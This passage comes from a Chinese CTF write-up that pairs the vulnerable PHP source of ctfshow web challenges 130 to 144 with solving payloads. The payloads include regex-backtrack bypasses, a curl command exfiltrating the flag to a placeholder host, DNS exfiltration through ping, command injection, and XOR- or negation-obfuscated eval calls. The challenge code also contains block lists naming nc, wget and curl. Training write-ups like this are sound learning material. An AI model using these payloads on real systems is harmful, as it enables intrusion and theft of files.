class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-33">payload</h3>
<h4 id="方法一-7">方法一</h4>
<p>简单一点的方法，可以直接使用数组进行绕过</p>
<p>很典型的一看到没有===强相等就可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST: f[]=1</span><br></pre></td></tr></table></figure>
<h4 id="方法二-7">方法二</h4>
<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)</a></p>
<p>又在P神的文章中学到一种崭新的思路，简单来说就是通过某种类似ddos的方法去绕开preg_match的限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">#网址填写</span><br><span class="line">url=&#x27;&#x27;</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;f&#x27;:&#x27;very&#x27;*1000000+&#x27;36Dctfshow&#x27;</span><br><span class="line">&#125;</span><br><span class="line">test=requests.post(url=url,data=data).text</span><br><span class="line">print(test)</span><br></pre></td></tr></table></figure>
<h2 id="web131">web131</h2>
<h3 id="源码-34">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="payload-34">payload</h3>
<p>跟上一题同一个问题。还是通过正则回溯去进行绕过</p>
<h2 id="web132">web132</h2>
<h3 id="源码-35">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-35">payload</h3>
<p>首先找到发现存在一个/admin的目录，找到源码</p>
<p>这里重点是一个$和||的问题，有一个运行的先后性，对于&amp;&amp;时，如果x&amp;&amp;y，则当x为false时，直接跳过，不执行y，如果x||y时，则当x为true时，直接跳过，不执行y。</p>
<p>这里就可以明白当第一个为false时，则第二个跳过，且正确执行第三个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=admin&amp;password=1&amp;username=admin</span><br></pre></td></tr></table></figure>
<h2 id="web133">web133</h2>
<h3 id="源码-36">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-36">payload</h3>
<p>只允许使用6个字母</p>
<p>目前看到了三种思路，反弹shell，curl外带，bash盲注</p>
<p>学到一种新姿势，curl带出，利用dnslog，也可以借助Bp的功能</p>
<p>但是实验了几次，没有成功，改用服务器的公网ip，注意一下开放策略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl  http://xxx:xxx?p=`tac f*`</span><br></pre></td></tr></table></figure>
<h2 id="web134">web134</h2>
<h3 id="源码-37">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-37">payload</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">parse_str():把查询字符串解析到变量中</span><br><span class="line">extract():函数从数组中将变量导入到当前的符号表</span><br></pre></td></tr></table></figure>
<p>看到parse_str函数，立刻考虑到是否存在变量覆盖的问题</p>
<p>extract($_POST); 进行解析$_POST数组，于是传入一个_POST数组，通过这个将key1和key2导入符号表中替换，得到满足条件的36d</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>
<h2 id="web135">web135</h2>
<h3 id="源码-38">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-38">payload</h3>
<p>由于curl外带等操作均失效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`;+ping `cat flag.php|awk &#x27;NR==1&#x27;`.[]</span><br></pre></td></tr></table></figure>
<p>官方的给定的使用ping命令去带出，但是尝试了几次dnslog都无任何效果（qwq）</p>
<p>因此使用另外一种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`;+`cp flag.php flag.txt`</span><br></pre></td></tr></table></figure>
<p>再访问flag.txt</p>
<h2 id="web136">web136</h2>
<h3 id="源码-39">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-39">payload</h3>
<p>tee命令的利用，或者盲注（好像这几道的题都没对盲注进行防范）</p>
<p>不详细写了 ，对这个命令不熟</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://ee1aff68-ecdb-46a3-896e-69c50b7c7f35.challenge.ctf.show/?c=cat /f149_15_h3r3 | tee 2</span><br></pre></td></tr></table></figure>
<h2 id="web137">web137</h2>
<h3 id="源码-40">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="payload-40">payload</h3>
<p>利用::访问静态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>
<h2 id="web138">web138</h2>
<h3 id="源码-41">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="payload-41">payload</h3>
<p>利用数组去调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>
<h2 id="web139">web139</h2>
<h3 id="源码-42">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-42">payload</h3>
<p>进行盲注，脚本暂时保留</p>
<h2 id="web140">web140</h2>
<h3 id="源码-43">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="payload-43">payload</h3>
<p>这里重点还是利用了intval的函数问题，当接受到非数字字符串时，会转换成0</p>
<p>如果某些函数在输入错误，或者参数不对的时候返回为0则可成功利用，本题就是利用了这个思路</p>
<p>官方给出的usleep函数因为没有返回值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f1=usleep&amp;f2=usleep</span><br></pre></td></tr></table></figure>
<p>当时此题非一解，利用如system函数包含参数就执行，否则就报错返回false，类似的解题方法即可</p>
<h2 id="web141">web141</h2>
<h3 id="源码-44">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-44">payload</h3>
<p>这边利用的特性是数字和命令可以进行运算</p>
<p>此外正则匹配\W：与任何非单词字符匹配。就是除了数字、字母、下划线。等价于[^A-Za-z0-9_]</p>
<p><code>1-phpinfo();</code>可以进行命令执行</p>
<p>因此可以得到原始的命令为以下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1=1&amp;v2=1&amp;v3=-phpinfo()-</span><br></pre></td></tr></table></figure>
<p>我们再尝试取反一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure>
<h2 id="web142">web142</h2>
<h3 id="源码-45">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="payload-45">payload</h3>
<p>v1要求传入一个数字，防止使用sleep沉睡时间，因此传入一共0即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1=0</span><br></pre></td></tr></table></figure>
<h2 id="web143">web143</h2>
<h3 id="源码-46">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-46">payload</h3>
<p>由于将±都进行了过滤，所有修改成^进行异或运算</p>
<p>感谢羽师傅，陆续将所有脚本重新修改成python和php双版本的小工具再放出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)*</span><br></pre></td></tr></table></figure>
<h2 id="web144">web144</h2>
<h3 id="源码-47">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span 